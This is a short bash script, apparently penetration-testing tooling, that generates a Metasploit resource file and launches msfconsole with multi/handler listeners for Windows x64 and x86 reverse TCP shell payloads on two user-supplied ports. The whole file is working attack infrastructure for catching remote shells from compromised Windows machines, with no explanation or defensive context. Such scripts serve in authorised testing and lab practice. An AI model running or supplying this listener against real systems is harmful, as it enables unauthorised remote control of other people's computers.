#!/bin/bash

ip=$1
portOne=$2
portTwo=$3

    echo Starting listener...
    touch config.rc
echo use exploit/multi/handler > config.rc
echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc
echo set LHOST $ip >> config.rc
echo set LPORT $portOne >> config.rc
echo set ExitOnSession false >> config.rc
echo set EXITFUNC thread >> config.rc
echo exploit -j >> config.rc
echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
echo set LPORT $portTwo >> config.rc
    echo exploit -j >> config.rc
/etc/init.d/postgresql start
msfconsole -r config.rc
/etc/init.d/postgresql stop
    rm config.rc